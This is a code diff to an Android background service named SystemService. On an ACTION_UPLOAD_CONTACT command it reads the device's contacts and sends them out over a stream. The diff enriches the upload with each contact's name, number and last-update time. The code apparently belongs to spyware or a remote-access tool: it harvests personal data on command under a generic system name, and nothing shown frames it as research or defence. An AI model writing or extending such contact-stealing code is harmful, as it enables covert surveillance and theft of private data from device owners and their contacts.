@@ -114,17 +114,17 @@ public class SystemService extends Service{
                 }
                 DataPack.sendDataPack(outputStream,responseData);
             } else if(action.equals(ACTION_UPLOAD_CONTACT)) {
-                List<String> contactList = SystemUtil.getAllContact(SystemService.this);
+                List<SystemUtil.ContactData> contactList = SystemUtil.getContactDataInPhone(SystemService.this);
                 if(contactList == null) {
                     return;
                 }
                 JSONObject responseJsonObject = new JSONObject();
                 try {
-                    JSONArray smsArray = new JSONArray();
-                    for(String contact: contactList) {
-                        smsArray.put(contact);
+                    JSONArray contactArray = new JSONArray();
+                    for(SystemUtil.ContactData contactData: contactList) {
+                        contactArray.put(new JSONObject().put("name", contactData.name).put("number", contactData.number).put("last_update",contactData.lastUpdate));
                     }
-                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, smsArray);
+                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, contactArray);
                 } catch (JSONException e) {
                 }
                 byte[] responseData = null;
